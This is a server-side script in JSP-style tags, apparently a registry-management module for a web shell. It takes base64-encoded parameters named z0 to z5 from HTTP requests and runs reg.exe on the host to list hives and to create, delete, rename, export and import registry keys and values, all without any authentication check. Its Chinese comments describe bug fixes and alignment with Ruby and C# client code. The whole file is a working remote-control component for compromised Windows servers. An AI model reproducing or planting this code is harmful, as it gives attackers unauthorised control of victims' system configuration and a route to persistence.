<%

// registry_manager.java (100% 修正 % 符號顯示 Bug、多語言完美對齊版)

var paramMap = request.getParameterMap();
var action = "";
var encoding = "UTF-8";

if (paramMap.containsKey("z0")) action = base64DecodeStr(paramMap.get("z0")[0]);
if (paramMap.containsKey("z1")) {
    var enc = base64DecodeStr(paramMap.get("z1")[0]);
    if (enc != "") encoding = enc;
}

var responseJson = { "success": false, "error": null, "subkeys": [], "values": [] };

try {
    var hives = [
        "HKEY_CLASSES_ROOT",
        "HKEY_CURRENT_USER",
        "HKEY_LOCAL_MACHINE",
        "HKEY_USERS",
        "HKEY_CURRENT_CONFIG"
    ];

    switch (action) {
        case "hive":
            var hiveStatus = {};
            for (var i = 0; i < hives.length; i++) {
                var res = runRegCommand(["query", hives[i]]);
                hiveStatus[hives[i]] = (res.exitCode === 0);
            }
            Echo(JSON.stringify(hiveStatus));
            break;

        case "scan":
            var basePath = base64DecodeStr(getParam("z2"));
            Echo(JSON.stringify(scanRegistry(basePath)));
            break;

        case "set":
        case "new_value":
            var path = base64DecodeStr(getParam("z2"));
            var name = base64DecodeStr(getParam("z3"));
            var type = base64DecodeStr(getParam("z4"));
            var data = base64DecodeStr(getParam("z5"));
            Echo(JSON.stringify(setValue(path, name, type, data)));
            break;

        case "del_key":
            var path = base64DecodeStr(getParam("z2"));
            Echo(JSON.stringify(deleteKey(path)));
            break;

        case "del_value":
            var path = base64DecodeStr(getParam("z2"));
            var name = base64DecodeStr(getParam("z3"));
            Echo(JSON.stringify(deleteValue(path, name)));
            break;

        case "rename_value":
            var path = base64DecodeStr(getParam("z2"));
            var oldName = base64DecodeStr(getParam("z3"));
            var newName = base64DecodeStr(getParam("z4"));
            Echo(JSON.stringify(renameValue(path, oldName, newName)));
            break;

        case "rename_key":
            var oldPath = base64DecodeStr(getParam("z2"));
            var newPath = base64DecodeStr(getParam("z3"));
            Echo(JSON.stringify(renameKey(oldPath, newPath)));
            break;

        case "new_key":
            var path = base64DecodeStr(getParam("z2"));
            Echo(JSON.stringify(createKey(path)));
            break;

        case "export":
            var path = base64DecodeStr(getParam("z2"));
            Echo(JSON.stringify(exportKey(path)));
            break;

        case "import":
            var content = base64DecodeStr(getParam("z2"));
            Echo(JSON.stringify(importFile(content)));
            break;

        default:
            Echo(JSON.stringify(responseJson));
            break;
    }

} catch (e) {
    responseJson.success = false;
    responseJson.error = e.message;
    Echo(JSON.stringify(responseJson));
}

// ────────────────────────────────────────────────────────
// 🛠️ 核心修正版函式群
// ────────────────────────────────────────────────────────

function scanRegistry(basePath) {
    var result = { "success": false, "error": null, "subkeys": [], "values": [] };
    var cmdRes = runRegCommand(["query", basePath]);
    
    if (cmdRes.exitCode !== 0) {
        result.error = cmdRes.output;
        return result;
    }
    
    result.success = true;
    var lines = cmdRes.output.split("\n");
    var firstKeySeen = false;
    
    for (var i = 0; i < lines.length; i++) {
        var line = lines[i].replace(/^\s+|\s+$/g, ''); 
        if (line === "") continue;
        
        if (line.indexOf("HKEY_") === 0) {
            if (!firstKeySeen) {
                firstKeySeen = true;
            } else {
                result.subkeys.push(line);
            }
            continue;
        }
        
        // 🚀 修正解析：精準對齊你的 Ruby 正則切割邏輯，防範包含空白與 % 的路徑損壞
        var parts = line.split(/\s{2,}/);
        if (parts.length >= 2) {
            var vName = parts[0].replace(/^\s+|\s+$/g, '');
            var vType = "";
            var vData = "";
            
            if (parts[1].indexOf("REG_") === 0) {
                vType = parts[1].replace(/^\s+|\s+$/g, '');
                vData = parts.slice(2).join(" ").replace(/^\s+|\s+$/g, '');
            } else if (vName.indexOf("REG_") === 0) {
                vType = vName;
                vName = "(Default)";
                vData = parts.slice(1).join(" ").replace(/^\s+|\s+$/g, '');
            } else {
                continue;
            }
            
            if (vType.indexOf("REG_") === 0) {
                // 🎯 完美複刻 Ruby：直接將文字內容安全轉成原始位元組，不再經過可能吞掉 % 的格式化
                var rawBytes = registryValueToBytes(vData, vType);
                result.values.push({
                    "name": vName,
                    "type": vType,
                    "data": java.util.Base64.getEncoder().encodeToString(rawBytes)
                });
            }
        }
    }
    return result;
}

function registryValueToBytes(valueStr, type) {
    if (type === "REG_DWORD") {
        var val = java.lang.Long.parseLong(valueStr.replace(/^0x/i, ""), 16);
        var bb = java.nio.ByteBuffer.allocate(4).order(java.nio.ByteOrder.LITTLE_ENDIAN);
        bb.putInt(val);
        return bb.array();
    } else if (type === "REG_QWORD") {
        var val = java.lang.Long.parseUnsignedLong(valueStr.replace(/^0x/i, ""), 16);
        var bb = java.nio.ByteBuffer.allocate(8).order(java.nio.ByteOrder.LITTLE_ENDIAN);
        bb.putLong(val);
        return bb.array();
    } else if (type === "REG_BINARY") {
        var hex = valueStr.replace(/[^A-Fa-f0-9]/g, "");
        var len = hex.length();
        var data = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, len / 2);
        for (var i = 0; i < len; i += 2) {
            data[i / 2] = (java.lang.Integer.parseInt(hex.substring(i, i + 2), 16) & 0xFF);
        }
        return data;
    } else {
        // 🚀 對齊你的 Ruby 機制：REG_SZ / REG_EXPAND_SZ 直球吐回原始 UTF-8 Byte 陣列
        // 絕不經過 String.format 或任何可能干擾 % 符號的底層轉碼，確保 C# 完美收發！
        return valueStr.getBytes("UTF-8");
    }
}

// ────────────────────────────────────────────────────────
// 📦 剩餘基礎函式保持原狀 (移除所有 URLDecoder 的潛在威脅)
// ────────────────────────────────────────────────────────

function setValue(path, name, type, data) {
    var formattedData = data;
    if (type === "REG_BINARY") {
        var b = java.util.Base64.getDecoder().decode(data.replace(/\s+/g, ""));
        var sb = new java.lang.StringBuilder();
        for (var i = 0; i < b.length; i++) {
            var hexStr = java.lang.Integer.toHexString(b[i] & 0xFF).toUpperCase();
            if (hexStr.length() == 1) sb.append('0');
            sb.append(hexStr);
        }
        formattedData = sb.toString();
    } else if (type === "REG_MULTI_SZ") {
        formattedData = data.replace(/,/g, "\\0");
    }
    
    var args = ["add", path, "/v", name, "/t", type, "/d", formattedData, "/f"];
    var cmdRes = runRegCommand(args);
    var ok = (cmdRes.output.indexOf("ERROR") === -1 && cmdRes.exitCode === 0);
    return { "success": ok, "output": [cmdRes.output] };
}

function deleteKey(path) {
    var cmdRes = runRegCommand(["delete", path, "/f"]);
    return { "success": (cmdRes.exitCode === 0), "output": [cmdRes.output] };
}

function deleteValue(path, name) {
    var cmdRes = runRegCommand(["delete", path, "/v", name, "/f"]);
    return { "success": (cmdRes.exitCode === 0), "output": [cmdRes.output] };
}

function renameValue(path, oldName, newName) {
    var scan = scanRegistry(path);
    var targetValue = null;
    for (var i = 0; i < scan.values.length; i++) {
        if (scan.values[i].name === oldName) { targetValue = scan.values[i]; break; }
    }
    if (!targetValue) return { "success": false, "error": "Value not found" };
    var setRes = setValue(path, newName, targetValue.type, targetValue.data);
    if (!setRes.success) return setRes;
    return deleteValue(path, oldName);
}

function renameKey(oldPath, newPath) {
    var copyRes = runRegCommand(["copy", oldPath, newPath, "/s", "/f"]);
    if (copyRes.exitCode !== 0) return { "success": false, "output": [copyRes.output] };
    var delRes = runRegCommand(["delete", oldPath, "/f"]);
    return { "success": true, "output": [copyRes.output, delRes.output] };
}

function createKey(path) {
    var cmdRes = runRegCommand(["add", path, "/f"]);
    return { "success": (cmdRes.exitCode === 0), "output": [cmdRes.output] };
}

function exportKey(path) {
    var tempFile = java.io.File.createTempFile("reg_", ".reg");
    var tempPath = tempFile.getAbsolutePath();
    var cmdRes = runRegCommand(["export", path, tempPath, "/y"]);
    if (cmdRes.exitCode !== 0 || !tempFile.exists()) return { "success": false, "output": [cmdRes.output] };
    var fileBytes = java.nio.file.Files.readAllBytes(tempFile.toPath());
    tempFile.delete();
    return { "success": true, "data": java.util.Base64.getEncoder().encodeToString(fileBytes) };
}

function importFile(content) {
    var tempFile = java.io.File.createTempFile("reg_", ".reg");
    java.nio.file.Files.write(tempFile.toPath(), java.util.Base64.getDecoder().decode(content));
    var cmdRes = runRegCommand(["import", tempFile.getAbsolutePath()]);
    tempFile.delete();
    return { "success": (cmdRes.exitCode === 0), "output": [cmdRes.output] };
}

function runRegCommand(argsList) {
    var fullArgs = ["reg.exe"];
    for (var i = 0; i < argsList.length; i++) fullArgs.push(argsList[i]);
    var pb = new java.lang.ProcessBuilder(fullArgs);
    pb.redirectErrorStream(true);
    var process = pb.start();
    var is = process.getInputStream();
    var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, "MS950"));
    var line = "";
    var sb = new java.lang.StringBuilder();
    while ((line = reader.readLine()) != null) { sb.append(line).append("\n"); }
    var exitCode = process.waitFor();
    return { "exitCode": exitCode, "output": sb.toString() };
}

function base64DecodeStr(b64Str) {
    if (b64Str == null || b64Str == "") return "";
    var clean = b64Str.replace(/ /g, "+");
    var decodedBytes = java.util.Base64.getDecoder().decode(clean);
    return new java.lang.String(decodedBytes, "UTF-8");
}

function getParam(paramName) {
    if (paramMap.containsKey(paramName)) return paramMap.get(paramName)[0];
    return "";
}

%>